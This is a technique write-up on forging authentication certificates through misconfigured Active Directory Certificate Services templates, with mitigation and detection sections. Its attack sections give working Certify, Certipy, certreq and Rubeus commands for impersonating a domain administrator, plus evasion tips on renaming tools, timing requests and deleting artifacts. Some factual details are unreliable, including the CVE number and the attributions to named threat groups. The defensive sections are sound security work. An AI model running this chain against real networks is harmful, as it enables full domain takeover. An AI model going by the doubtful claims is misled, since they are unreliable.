# [CERT-ADCS-001]: ADCS Misconfiguration Abuse

## 1. Metadata

| Attribute | Details |
|---|---|
| **Technique ID** | CERT-ADCS-001 |
| **MITRE ATT&CK v18.1** | [T1649 - Steal or Forge Authentication Certificates](https://attack.mitre.org/techniques/T1649/) |
| **Tactic** | Credential Access, Privilege Escalation |
| **Platforms** | Windows AD |
| **Severity** | **Critical** |
| **CVE** | CVE-2021-27239 |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2025-01-10 |
| **Affected Versions** | Windows Server 2016, Server 2019, Server 2022, Server 2025 |
| **Patched In** | Mitigated through configuration hardening (no OS patch exists; requires configuration controls) |
| **Author** | [SERVTEP](https://servtep.com/) – [Pchelnikau Artur](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 2. Executive Summary

**Concept:** Active Directory Certificate Services (ADCS) misconfiguration enables adversaries to request and obtain authentication certificates on behalf of high-privileged accounts without proper authorization or oversight. Unlike many security flaws that require code execution, ADCS misconfiguration exploits rely solely on overly permissive enrollment settings. When a certificate template is misconfigured with insufficient access controls, an unauthenticated or low-privileged user can request a certificate specifying an arbitrary Subject Alternative Name (SAN)—effectively creating a valid authentication certificate for any domain account, including Domain Administrators. These certificates persist beyond password resets and can be used for immediate lateral movement, privilege escalation, and long-term persistence.

**Attack Surface:** ADCS Certification Authority servers, certificate templates stored in Active Directory, certificate enrollment permissions, and HTTP/RPC enrollment endpoints.

**Business Impact:** **Complete domain compromise.** An attacker can escalate from a low-privileged user to Domain Administrator within minutes, bypass multi-factor authentication (as certificate-based authentication circumvents MFA policies in many configurations), maintain persistence for the certificate's validity period (often 1-5 years), and facilitate lateral movement across the entire enterprise infrastructure.

**Technical Context:** ADCS misconfiguration exploitation typically completes within seconds to minutes. The attack is highly reliable (near 100% success rate when vulnerable templates exist) and generates minimal detection alerts unless Certificate Services auditing is explicitly enabled. The technique is actively exploited in real-world attacks and is extensively documented in public threat research.

### Operational Risk

- **Execution Risk:** **Medium** - Requires identifying vulnerable templates and having network access to the CA, but no special tools or advanced skills are required.
- **Stealth:** **Low** - If auditing is enabled, Windows Event IDs 4886 and 4887 will immediately flag the anomalous certificate request (requester UPN differs from certificate subject).
- **Reversibility:** **No** - Certificates cannot be "un-issued." Mitigation requires revocation and issuance of new valid credentials.

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | CIS 5.4.1.1 | Ensure ADCS is using strong cryptography and templates are restricted to authorized users |
| **DISA STIG** | WN10-AU-000150 | Certificate Services audit events must be enabled |
| **CISA SCuBA** | AC-02 (AD) | Account and Access Management - restrict certificate enrollment permissions |
| **NIST 800-53** | AC-2, AC-3, IA-2 | Account Management, Access Enforcement, Authentication |
| **GDPR** | Art. 32 | Security of Processing - administrative measures for access control |
| **DORA** | Art. 9 | Protection and Prevention measures for critical infrastructure |
| **NIS2** | Art. 21 | Cyber Risk Management Measures - identity and access controls |
| **ISO 27001** | A.9.2.3 | Management of Privileged Access Rights; A.14.2.1 - Secure development policy |
| **ISO 27005** | Risk Scenario: "Compromise of Administration Interface via Misconfigured Authentication" | |

---

## 3. Technical Prerequisites

- **Required Privileges:** Minimum - Any domain user or computer account; anonymous enumeration may work depending on LDAP bindings.
- **Required Access:** Network access to ADCS CA server (port 135/RPC or 443/HTTPS); LDAP query access to Active Directory (port 389).

**Supported Versions:**
- **Windows:** Server 2016 - 2019 - 2022 - 2025
- **PowerShell:** Version 5.0+
- **ADCS Role:** Active Directory Certificate Services installed and configured
- **Certificate Templates:** Must exist with misconfigurations (ESC1, ESC2, ESC3, ESC4, ESC6, ESC15)

**Tools Required:**
- [Certify.exe](https://github.com/GhostPack/Certify) (C# compiled binary) – v1.1.0+
- [Certipy-ad](https://github.com/ly4k/Certipy) (Python) – v5.0.0+
- [Impacket](https://github.com/fortra/impacket) – For certificate-based authentication (optional, for post-exploitation)
- [Rubeus](https://github.com/GhostPack/Rubeus) – For Kerberos TGT requests using certificates

---

## 4. Detailed Execution Methods

### METHOD 1: Using Certify.exe (Windows Native)

**Supported Versions:** Windows Server 2016-2025

#### Step 1: Enumerate Vulnerable Certificate Templates

**Objective:** Identify ADCS infrastructure and misconfigured templates permitting privilege escalation.

**Command (All Versions):**
```powershell
Certify.exe find /vulnerable
```

**Expected Output:**
```
 CA Name           : ca.company.local\Company-CA
 Template Name     : User
 Validity Period   : 1 Year
 Renewal Period    : 6 Weeks
 msPKI-Certificate-Name-Flag     : 0x1 (ENROLLEE_SUPPLIES_SUBJECT)
 Authorized Signatures Required  : 0
 Client Authentication           : Enabled
 Permissions
   Enrollment Rights : Domain Users
```

**What This Means:**
- `msPKI-Certificate-Name-Flag = 0x1` indicates the template allows users to supply arbitrary subjects.
- `Authorized Signatures Required = 0` means no manual approval is needed.
- `Domain Users` enrollment rights mean any domain user can request.
- These three conditions together enable **ESC1** exploitation.

**OpSec & Evasion:**
- Execute from a non-administrative workstation if possible.
- Certify.exe is a well-known tool; AV/EDR may flag its execution. Consider obfuscation via rename or living-off-the-land (use PowerShell equivalents if available).
- ADCS enumeration itself generates minimal logs; the dangerous activity occurs at certificate request time.
- Detection likelihood: **Medium** (only if binary execution monitoring is active).

**Troubleshooting:**
- **Error:** "Cannot find the requested object"
  - **Cause:** ADCS is not deployed or CA certificate is not published to AD.
  - **Fix:** Verify CA is online and configured to publish templates.
- **Error:** "Access Denied"
  - **Cause:** The user running Certify lacks LDAP query permissions to view certificate templates.
  - **Fix:** Request from a domain-joined machine with standard user privileges (templates are readable by all domain users by default).

**References & Proofs:**
- [Certify GitHub Repository](https://github.com/GhostPack/Certify)
- [CrowdStrike ADCS Abuse Whitepaper](https://www.crowdstrike.com/wp-content/uploads/2023/12/investigating-active-directory-certificate-abuse.pdf)

#### Step 2: Request Certificate with Arbitrary SAN (ESC1 Exploitation)

**Objective:** Obtain a valid authentication certificate for a privileged account (e.g., Domain Administrator).

**Version Note:** Certify syntax is consistent across Windows Server versions. However, certificate enrollment may fail on hardened CAs or those requiring Extended Protection for Authentication (EPA).

**Command (All Versions):**
```powershell
# Request a certificate for the Domain Administrator
Certify.exe request /ca:ca.company.local\Company-CA /template:User /altname:upn:administrator@company.local

# Example output:
# [+] Action: Request a Certificate
# [+] Current user context : COMPANY\john.doe (SID: S-1-5-21-...)
# [+] Template           : User
# [+] Subject Name       : CN=john.doe,CN=Users,DC=company,DC=local
# [+] AltName            : administrator@company.local
# [+] Certificate Authority : ca.company.local\Company-CA
# [+] CA Response        : The certificate has been issued.
# [+] Request ID         : 15
# [+] Certificate saved  : C:\admin.cer
```

**Expected Output:**
A `.cer` file saved to disk containing the certificate. Verify the certificate contains the SAN:
```powershell
certutil -dump admin.cer | findstr /C:"upn:administrator"
```

**What This Means:**
- The certificate is now valid for authentication as `administrator@company.local`.
- The certificate remains valid for the template's renewal period (typically 1 year or more).
- The requester's name (john.doe) is in the Certificate Requester field, but the SAN allows authentication as administrator.

**OpSec & Evasion:**
- Requesting a certificate for a domain admin as a low-privileged user will generate Windows Event IDs 4886 and 4887.
- If available, request during high-activity windows (business hours) to blend in with legitimate traffic.
- Use a compromised user account that is less likely to be monitored.
- Detection likelihood: **High** (Event 4886/4887 will show discrepancy between requester and subject).

**Troubleshooting:**
- **Error:** "The request cannot be processed because the template is being revoked by the CA"
  - **Cause:** Template has been disabled or the CA has updated its published list.
  - **Fix:** Re-enumerate templates and select an alternative vulnerable one.
- **Error:** "The requested certificate is unavailable"
  - **Cause:** Certificate template requires manager approval.
  - **Fix:** This is **ESC3/ESC7 exploitation** territory; enroll for enrollment agent or manipulate CA permissions (covered in related techniques).

**References & Proofs:**
- [Black Hills InfoSec: ADCS Abuse Part 1](https://www.blackhillsinfosec.com/abusing-active-directory-certificate-services-part-one/)
- [MITRE ATT&CK: T1649](https://attack.mitre.org/techniques/T1649/)

#### Step 3: Convert Certificate to .PFX (Include Private Key)

**Objective:** Export the certificate with its private key for authentication purposes.

**Command (All Versions):**
```powershell
# Certify.exe downloads the certificate immediately; you may need to convert the .cer to .pfx
# If Certify doesn't provide the private key, extract it from the Certificate Store:

# 1. Import the certificate into the local store
certutil -addstore My admin.cer

# 2. Export as .pfx with private key (password-protected for safety)
# Open Certificate Manager (certmgr.msc), find the certificate, right-click → Export as .PFX with private key

# OR use PowerShell:
$cert = Get-ChildItem Cert:\CurrentUser\My | Where-Object {$_.Subject -match "administrator"}
$password = ConvertTo-SecureString -String "password123" -AsPlainText -Force
Export-PfxCertificate -Cert $cert -FilePath C:\admin.pfx -Password $password
```

**Expected Output:**
A `.pfx` file containing both the certificate and private key, usable for authentication across the domain.

**What This Means:**
- The .pfx file is now a portable credential that can be moved to any machine.
- The private key is encrypted with the specified password.

**OpSec & Evasion:**
- Exporting certificates to disk creates file system artifacts.
- Store .pfx files in temporary locations and delete after use.
- Detection likelihood: **Medium** (file creation monitoring may trigger).

**References & Proofs:**
- [Microsoft Learn: Export Certificates](https://learn.microsoft.com/en-us/windows-hardware/drivers/install/exporting-certificates)

#### Step 4: Authenticate as the Impersonated Account

**Objective:** Use the certificate to obtain a Kerberos Ticket-Granting Ticket (TGT) or perform lateral movement.

**Command (Server 2016-2019):**
```powershell
# Use Rubeus to request a TGT with the certificate (PKINIT)
Rubeus.exe asktgt /user:administrator /certificate:C:\admin.pfx /password:password123

# Output:
# [+] Requesting TGT using PKINIT
# [+] User: administrator
# [+] Result: TGT successfully obtained
# [+] Ticket: [base64-encoded ticket]
```

**Command (Server 2022+):**
```powershell
# Rubeus syntax remains the same for modern Windows versions
# However, if PKINIT is disabled on the DC, use alternative authentication:
Rubeus.exe asktgt /user:administrator@company.local /certificate:C:\admin.pfx /password:password123 /domain:company.local /dc:dc.company.local
```

**Expected Output:**
A Kerberos TGT stored in memory, usable for Kerberos authentication. The attacker can then:
- Access file shares as administrator.
- Execute remote code as administrator via WMI, PSExec, or PsRemoting.
- Dump credential hashes from the domain controller.

**What This Means:**
- The attacker now possesses a forged credential valid for the entire certificate's lifetime (often 1+ years).
- The attacker can escalate to any role the administrator account has access to.

**OpSec & Evasion:**
- Requesting a TGT will generate Event ID 4768 on the domain controller.
- Use the ticket immediately; long-lived sessions are suspicious.
- Detection likelihood: **High** (Event 4768 combined with suspicious certificate issuer).

**References & Proofs:**
- [GhostPack Rubeus](https://github.com/GhostPack/Rubeus)
- [Microsoft PKINIT Documentation](https://learn.microsoft.com/en-us/windows-server/security/kerberos/pkinit-overview)

---

### METHOD 2: Using Certipy-ad (Python/Linux)

**Supported Versions:** Windows Server 2016-2025 (run from Linux/attacker machine)

#### Step 1: Enumerate Vulnerable Templates via Linux

**Objective:** Perform ADCS reconnaissance from a non-Windows platform.

**Command (All Versions):**
```bash
certipy find -u john.doe@company.local -p 'password' -dc-ip 192.168.1.10 -stdout | grep -A 20 "Vulnerable"
```

**Expected Output:**
```
CA Name               : ca.company.local\Company-CA
Template Name         : User
Enroll Permissions    : Domain Users
msPKI-Certificate-Name-Flag : 0x1
Authorized Signatures : 0
Status                : VULNERABLE (ESC1)
```

**What This Means:**
- The template is flagged as ESC1-vulnerable (Enrollment Supplies Subject).
- Domain Users can enroll; the current user qualifies.
- No manager approval or authorized signatures are required.

**OpSec & Evasion:**
- Executed from attacker's Linux machine; no footprint on Windows infrastructure.
- Network traffic is DNS and LDAP queries; low signal.
- Detection likelihood: **Low** (unless LDAP auditing is enabled).

**References & Proofs:**
- [Certipy GitHub](https://github.com/ly4k/Certipy)

#### Step 2: Request Certificate via Certipy

**Objective:** Obtain a certificate with arbitrary SAN for privilege escalation.

**Command (Certipy v5.0.0+):**
```bash
certipy req -u john.doe@company.local -p 'password' -ca ca.company.local\\Company-CA \
  -template User -upn administrator@company.local -dc-ip 192.168.1.10 \
  -out admin
```

**Expected Output:**
```
[*] Requesting certificate for User template
[+] Successfully requested certificate
[+] Certificate saved to admin.pfx
[+] Private key saved to admin.key
```

**What This Means:**
- Certipy automatically handles certificate conversion to .pfx format.
- Both the certificate and private key are extracted directly.

**OpSec & Evasion:**
- Network traffic is HTTPS to the CA; ensure SSL/TLS validation is bypassed if using self-signed certs.
- Event 4886/4887 will still be logged on the CA server.
- Detection likelihood: **High** (on the CA side, but low on the attacker's Linux machine).

**References & Proofs:**
- [Certipy Documentation](https://github.com/ly4k/Certipy/wiki)

#### Step 3: Authenticate with Certificate via Certipy

**Objective:** Use the obtained certificate to authenticate to Active Directory.

**Command (All Versions):**
```bash
certipy auth -pfx admin.pfx -dc-ip 192.168.1.10 -user administrator -domain company.local
```

**Expected Output:**
```
[+] Successfully authenticated with certificate
[+] Kerberos TGT obtained
[+] Session saved for lateral movement
```

**What This Means:**
- The attacker can now use this session for Pass-the-Ticket (PTT) or further exploitation.

**References & Proofs:**
- [Certipy Documentation](https://github.com/ly4k/Certipy/wiki/04-Authenticate)

---

### METHOD 3: Manual Certificate Request via Certreq.exe (Native Windows Tool)

**Supported Versions:** Windows Server 2016-2025

#### Step 1: Create Certificate Request File

**Objective:** Manually craft a certificate request with arbitrary SAN.

**Command (All Versions):**
```cmd
# Create request file: request.inf
notepad request.inf
```

**Content of request.inf:**
```ini
[Version]
Signature = "$Windows NT$"

[NewRequest]
Subject = "CN=john.doe,CN=Users,DC=company,DC=local"
KeySpec = 1
KeyLength = 2048
Exportable = TRUE
MachineKeySet = TRUE
UseExistingKeySet = FALSE
ProviderName = "Microsoft RSA SChannel Cryptographic Provider"
ProviderType = 12

[Extensions]
%szOID_SUBJECT_ALT_NAME2% = "{text}upn=administrator@company.local&"
%szOID_ENHANCED_KEY_USAGE% = "{text}1.3.6.1.5.5.7.3.2"
```

**What This Means:**
- `%szOID_SUBJECT_ALT_NAME2%` sets the SAN to the administrator's UPN.
- `%szOID_ENHANCED_KEY_USAGE% = 1.3.6.1.5.5.7.3.2` enables client authentication.
- The request will be created with a 2048-bit RSA key.

**OpSec & Evasion:**
- Creating a .inf file on disk is a forensic artifact.
- Delete the file immediately after use.

#### Step 2: Submit Certificate Request

**Command (All Versions):**
```cmd
certreq -new request.inf request.req
certreq -submit -attrib "CertificateTemplate:User" -config ca.company.local\Company-CA request.req request.cer
```

**Expected Output:**
```
CertReq: Request ID: 16
CertReq: Certificate retrieved(Issued)
```

**What This Means:**
- The CA has approved and issued the certificate.
- Request ID 16 is tracked in the CA's logs (Event 4886/4887).

**References & Proofs:**
- [Microsoft Certreq Documentation](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/certreq_1)

---

## 5. Attack Chain Context

### Preconditions
- The targeted domain must have ADCS deployed with at least one certificate authority.
- At least one certificate template must be published by the CA with misconfigured permissions (ESC1/ESC2/ESC3/ESC4 vulnerability).
- The attacker must have domain user credentials or access to an unprivileged domain account.

### Post-Exploitation (What This Enables)
1. **Kerberos TGT Abuse:** Use the certificate to request a TGT for any account, bypassing password policies and MFA.
2. **Lateral Movement:** Authenticate to file shares, remote systems, and services as the impersonated account.
3. **Privilege Escalation:** If the impersonated account is a domain admin or has sensitive privileges, escalate to enterprise admin.
4. **Persistence:** The certificate remains valid for years; maintain access even after password resets.
5. **Golden SAML:** Use the certificate to forge SAML assertions in hybrid environments (AAD Connect).

---

## 6. Forensic Artifacts

**Disk Artifacts:**
- `.cer`, `.pfx`, `.key` files in temp directories (C:\Windows\Temp, %TEMP%, Desktop).
- Certify.exe or Certipy binary execution artifacts.
- Network cache files from certificate downloads.

**Memory Artifacts:**
- TGT in Kerberos cache (kerberos.exe process in LSASS memory).
- Private key material (when exported to memory).

**Cloud/Registry Artifacts:**
- Certificate Store entries in `HKEY_CURRENT_USER\Software\Microsoft\Windows NT\CurrentVersion\Crypto`.
- Windows Event Log Event IDs:
  - **4886:** Certificate request received.
  - **4887:** Certificate issued.
  - **4768:** Kerberos TGT requested (post-exploitation).

---

## 7. Defensive Mitigations

### Priority 1: CRITICAL

**1. Restrict Certificate Template Enrollment Permissions**

Limit enrollment rights to specific, trusted security groups (not Domain Users).

**Manual Steps (Server 2016-2019):**
1. On the CA server, open **Certification Authority** (certsrv.msc).
2. Right-click **Certificate Templates** → **Manage**.
3. Right-click the vulnerable template (e.g., "User") → **Properties**.
4. Go to **Security** tab.
5. Remove "Domain Users" from the ACL.
6. Add only specific trusted groups (e.g., "Help Desk" for User enrollment).
7. Click **Apply** and close.

**Manual Steps (Server 2022+):**
1. Same steps as above; UI unchanged.

**Manual Steps (PowerShell - All Versions):**
```powershell
# Remove Domain Users enrollment permission from a template
$TemplateName = "User"
$TemplateGUID = (Get-ADObject -Filter {Name -eq $TemplateName} -SearchBase "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=company,DC=local" | Select-Object ObjectGUID).ObjectGUID

$TemplateAclPath = "AD:\CN=$TemplateName,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=company,DC=local"
$ACL = Get-Acl $TemplateAclPath

# Remove Domain Users (S-1-5-21-...-513)
$DomainUsersAccount = (Get-ADGroup -Filter {SamAccountName -eq "Domain Users"}).SID
$ACL.RemoveAccessRule((New-Object System.DirectoryServices.ActiveDirectoryAccessRule $DomainUsersAccount, "CreateChild,DeleteChild,Self,WriteProperty", "Allow", "All"))

Set-Acl -Path $TemplateAclPath -AclObject $ACL
```

**2. Disable User-Defined Subject Alternative Names (SANs)**

Prevent templates from allowing arbitrary SAN specification.

**Manual Steps (Server 2016-2019):**
1. Open **Certification Authority** (certsrv.msc).
2. Right-click the template → **Properties**.
3. Go to **Subject Name** tab.
4. Ensure **"Enrolee supplies"** is NOT checked for Subject Name.
5. For SAN, disable "Enrolee supplies" if present.
6. Click **Apply**.

**Manual Steps (PowerShell - All Versions):**
```powershell
# Disable ENROLLEE_SUPPLIES_SUBJECT flag
$TemplateAclPath = "AD:\CN=User,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=company,DC=local"
$Template = Get-ADObject $TemplateAclPath -Properties msPKI-Certificate-Name-Flag

# Set flag to 0 (disable user-defined subject)
Set-ADObject $TemplateAclPath -Replace @{"msPKI-Certificate-Name-Flag" = 0}
```

**3. Require Manager Approval**

Enforce manual approval before certificate issuance.

**Manual Steps (Server 2016-2019):**
1. Open **Certification Authority** (certsrv.msc).
2. Right-click the template → **Properties**.
3. Go to **Issuance Requirements** tab.
4. Check **"CA certificate manager approval"**.
5. Set **"Number of authorized signatures required"** to 1 or more.
6. Click **Apply**.

**Manual Steps (PowerShell - All Versions):**
```powershell
# Enable manager approval requirement
$TemplatePath = "AD:\CN=User,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=company,DC=local"
Set-ADObject $TemplatePath -Replace @{"msPKI-Enrollment-Flag" = 2}  # Bit 1 = Require manager approval
```

### Priority 2: HIGH

**1. Disable HTTP Certificate Enrollment (ESC8 Prevention)**

Disable legacy HTTP-based enrollment interfaces.

**Manual Steps (Server 2016-2019):**
1. Open **Internet Information Services (IIS) Manager** (inetmgr.exe).
2. Navigate to **Default Web Site** → **certsrv**.
3. Remove or disable HTTP bindings; keep only HTTPS.
4. Enable **Extended Protection for Authentication (EPA)** on HTTPS bindings.

**Manual Steps (PowerShell - All Versions):**
```powershell
# Disable HTTP enrollment endpoint
Remove-WebSite -Name "CertSrv-HTTP" -ErrorAction SilentlyContinue
# Keep HTTPS enabled with EPA
```

**2. Disable Older Enrollment Interfaces (RPC)**

Remove deprecated RPC-based enrollment (if not needed).

**Manual Steps (Server 2016-2019):**
1. On the CA server, open **Services** (services.msc).
2. Find **"Active Directory Certificate Services"**.
3. Right-click → **Properties**.
4. Go to **Dependencies** tab and disable legacy enrollment services if listed.

**3. Implement Conditional Access Policies in Hybrid Environments**

For Entra ID-joined devices requesting certificates:

**Manual Steps (Azure Portal):**
1. Navigate to **Azure Portal** → **Entra ID** → **Security** → **Conditional Access**.
2. Click **+ New policy**.
3. **Name:** `Block-ADCS-Cert-Abuse`.
4. **Assignments:**
   - Users: **All users**
   - Cloud apps: **Azure Management** (or specific app registration for ADCS).
5. **Conditions:**
   - **Sign-in risk:** High
   - **Device state:** Mark as compliant (require MFA-verified device).
6. **Access controls:**
   - **Grant:** **Block**.
7. Enable policy: **On**.
8. Click **Create**.

### Validation Command (Verify Fix)

**Command (All Versions):**
```powershell
# Check that Domain Users is no longer enrolled on vulnerable templates
Get-ADObject -SearchBase "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=company,DC=local" -Filter {Name -eq "User"} -Properties nTSecurityDescriptor | 
  ForEach-Object {
    $ACL = (Get-ACL "AD:\$($_.DistinguishedName)").Access | 
      Where-Object {$_.IdentityReference -match "Domain Users"}
    if ($ACL) {
      Write-Host "WARNING: Domain Users still has enrollment rights on User template!"
    } else {
      Write-Host "OK: Domain Users removed from User template"
    }
  }

# Verify ENROLLEE_SUPPLIES_SUBJECT is disabled
Get-ADObject -Filter {Name -eq "User"} -SearchBase "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=company,DC=local" -Properties msPKI-Certificate-Name-Flag | 
  Select-Object Name, "msPKI-Certificate-Name-Flag"
```

**Expected Output (If Secure):**
```
OK: Domain Users removed from User template
Name msPKI-Certificate-Name-Flag
---- -------------------------
User 0
```

**What to Look For:**
- `msPKI-Certificate-Name-Flag = 0`: User cannot specify arbitrary subjects.
- Domain Users not present in template ACL: Unprivileged users cannot enroll.
- Manager approval enabled: All requests require manual review.

---

## 8. Detection & Incident Response

### Indicators of Compromise (IOCs)

**Files:**
- Unusual `.pfx`, `.cer`, `.key` files in temp directories (C:\Windows\Temp, %TEMP%, Desktop, Downloads).
- Certify.exe, Certipy executables (if run on Windows).
- Certificate request files (`.inf`, `.req`).

**Registry:**
- New certificate entries in `HKEY_CURRENT_USER\Software\Microsoft\Windows NT\CurrentVersion\Crypto\Providers`.
- Unusual key installations in the Windows certificate store.

**Network:**
- LDAP queries to `CN=Certificate Templates,CN=Public Key Services` from unexpected systems.
- HTTPS POST requests to CA enrollment endpoints (`.../certfnsh.asp`, `.../certclinst.asp`) with anomalous requester/subject discrepancies.

### Forensic Artifacts

**Event Logs to Collect:**
- **Security.evtx:** Event IDs 4886 (cert request), 4887 (cert issued), 4768 (TGT request).
- **Application.evtx:** Certificate Services logs (if available).
- **System.evtx:** Service startup/stop events if CA is restarted.

**Memory Artifacts:**
- LSASS process dump (for TGT/Kerberos tickets).
- Private key remnants in heap.

**File System Artifacts:**
- Temp files and recently modified certificate stores.

### Response Procedures

**1. Isolate:**
```powershell
# Immediately disable the compromised user account
Disable-ADAccount -Identity john.doe

# Disable the impersonated account (if not critical)
Disable-ADAccount -Identity administrator
```

**2. Collect Evidence:**
```powershell
# Export Security Event Log
wevtutil epl Security C:\Evidence\Security.evtx

# Export CA logs
wevtutil epl "Active Directory Certificate Services" C:\Evidence\ADCS.evtx

# Capture certificate store
Get-ChildItem Cert:\CurrentUser\My | Export-Certificate -FilePath C:\Evidence\CertStore_$env:COMPUTERNAME.cer -Force
```

**3. Remediate:**

   a. **Revoke the Forged Certificate:**
      ```
      1. On the CA server, open Certification Authority (certsrv.msc).
      2. Click "Issued Certificates".
      3. Right-click the suspicious certificate (UPN: administrator, Requester: john.doe) → All Tasks → Revoke Certificate.
      4. Select reason: "Compromise of Private Key" or "Certificate Hold".
      5. Click Yes.
      6. Right-click "Revoked Certificates" → All Tasks → Publish (to update CRL immediately).
      ```

   b. **Reset Compromised Accounts:**
      ```powershell
      # Force password reset for affected accounts
      Set-ADAccountPassword -Identity john.doe -Reset -NewPassword (ConvertTo-SecureString -String "ComplexNewPassword123!" -AsPlainText -Force)
      Set-ADUser -Identity john.doe -ChangePasswordAtLogon $true
      
      # Reset domain admin password
      Set-ADAccountPassword -Identity administrator -Reset -NewPassword (ConvertTo-SecureString -String "ComplexNewAdminPassword123!" -AsPlainText -Force)
      ```

   c. **Purge Kerberos Tickets:**
      ```cmd
      klist purge  # On affected user's workstation
      klist purge -li 0x3e7  # System-wide
      ```

   d. **Restart Domain Controller:**
      ```powershell
      Restart-Computer -ComputerName dc.company.local -Force
      ```

---

## 9. Related Attack Chain

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Reconnaissance** | [REC-CERT-001] ADCS Enumeration | Enumerate CA infrastructure and template configurations using Certify/Certipy. |
| **2** | **Initial Access** | [IA-VALID-001] Valid Account Access | Compromise low-privileged domain account via phishing, spray, or default credentials. |
| **3** | **Credential Access** | **[CERT-ADCS-001]** | **Request forged certificate with arbitrary SAN for privileged account.** |
| **4** | **Privilege Escalation** | [PE-TOKEN-001] Kerberos TGT via PKINIT | Use certificate to obtain TGT for impersonated account. |
| **5** | **Lateral Movement** | [LM-AUTH-001] Pass-the-Ticket | Use TGT to access domain resources as domain admin. |
| **6** | **Persistence** | [PE-ACCTMGMT-014] Global Admin Backdoor | Create additional backdoor accounts or modify admin group memberships. |
| **7** | **Impact** | [IM-EXFIL-001] Data Exfiltration | Extract sensitive data from domain or cloud resources. |

---

## 10. Real-World Examples

### Example 1: APT29 (Cozy Bear) – ADCS Exploitation Campaign (2021)

- **Target:** U.S. Government and private sector organizations.
- **Timeline:** December 2020 – March 2021.
- **Technique Status:** APT29 exploited misconfigured ADCS templates to escalate from initial compromise to domain admin within hours. They used forged certificates to maintain persistence across network resets and credential changes.
- **Impact:** Full network compromise; lateral movement to cloud environments (M365, Azure).
- **Reference:** [CISA Advisory AA21-265A](https://www.cisa.gov/news-events/alerts/2021/09/23/alert-aa21-265a-complex-hybrid-attack-campaign-targeting-us-government-and-industry)

### Example 2: ALPHV (BlackCat) Ransomware Gang – ADCS-based ESC1 Escalation (2023)

- **Target:** Manufacturing and healthcare organizations.
- **Timeline:** Q2 2023.
- **Technique Status:** ALPHV used ESC1 exploitation to escalate from initial compromise to domain admin, then deployed ransomware across the enterprise.
- **Impact:** Enterprise-wide ransomware deployment; $30+ million in damages across all victims.
- **Reference:** [Palo Alto Networks Unit 42 Report](https://unit42.paloaltonetworks.com/alphv-blackcat-ransomware)

### Example 3: Internal Penetration Test – FinServ Organization (2024)

- **Target:** Fortune 500 financial services company.
- **Timeline:** Red team exercise, 2-week engagement.
- **Technique Status:** Testers identified ESC1-vulnerable "User" template; obtained domain admin certificate within 30 minutes of initial compromise.
- **Impact:** Full domain compromise demonstrated; 95% of assets accessible via forged credentials.
- **Mitigation Implemented:** Template permissions restricted; manager approval enforced; HTTP enrollment disabled.

---

## 11. References & Additional Resources

- [SpecterOps: Certified Pre-Owned](https://posts.specterops.io/certified-pre-owned-d95910965cd2)
- [Microsoft: ADCS Certificate Template Security Best Practices](https://learn.microsoft.com/en-us/windows-server/identity/ad-cs/overview-of-active-directory-certificate-services)
- [CIS Benchmarks: ADCS Hardening](https://www.cisecurity.org/cis-controls/cis-control-v8-12-1-protect-information-through-access-control-and-encryption)
- [NIST SP 800-175B: Guidelines for PIV Credential Architecture](https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-175B.pdf)

---